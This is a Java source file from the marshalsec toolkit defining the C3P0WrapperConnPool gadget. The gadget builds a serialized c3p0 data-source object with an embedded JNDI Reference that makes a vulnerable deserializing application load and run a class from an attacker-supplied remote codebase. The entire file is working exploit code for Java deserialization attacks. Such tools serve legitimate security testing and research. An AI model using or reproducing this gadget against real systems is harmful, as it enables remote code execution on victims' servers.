/* MIT License

Copyright (c) 2017 Moritz Bechler

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
*/
package marshalsec.gadgets;


import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationTargetException;
import java.util.Hashtable;

import javax.naming.Name;
import javax.naming.Reference;

import org.apache.commons.codec.binary.Hex;

import com.mchange.v2.c3p0.WrapperConnectionPoolDataSource;

import marshalsec.MarshallerBase;
import marshalsec.UtilFactory;
import marshalsec.util.Reflections;


/**
 * @author mbechler
 *
 */
public interface C3P0WrapperConnPool extends Gadget {

    @Primary
    @Args ( minArgs = 2, args = {
        "codebase", "class"
    }, defaultArgs = {
        MarshallerBase.defaultCodebase, MarshallerBase.defaultCodebaseClass
    } )
    default Object makeWrapperConnPool ( UtilFactory uf, String[] args ) throws Exception {
        WrapperConnectionPoolDataSource obj = Reflections.createWithoutConstructor(com.mchange.v2.c3p0.WrapperConnectionPoolDataSource.class);
        Reflections.setFieldValue(obj, "userOverridesAsString", makeC3P0UserOverridesString(args[ 0 ], args[ 1 ]));
        return obj;
    }


    public static String makeC3P0UserOverridesString ( String codebase, String clazz ) throws ClassNotFoundException, NoSuchMethodException,
            InstantiationException, IllegalAccessException, InvocationTargetException, IOException {

        ByteArrayOutputStream b = new ByteArrayOutputStream();
        try ( ObjectOutputStream oos = new ObjectOutputStream(b) ) {
            Class<?> refclz = Class.forName("com.mchange.v2.naming.ReferenceIndirector$ReferenceSerialized"); //$NON-NLS-1$
            Constructor<?> con = refclz.getDeclaredConstructor(Reference.class, Name.class, Name.class, Hashtable.class);
            con.setAccessible(true);
            Reference jndiref = new Reference("Foo", clazz, codebase);
            Object ref = con.newInstance(jndiref, null, null, null);
            oos.writeObject(ref);
        }

        return "HexAsciiSerializedMap:" + Hex.encodeHexString(b.toByteArray()) + ";"; //$NON-NLS-1$
    }
}
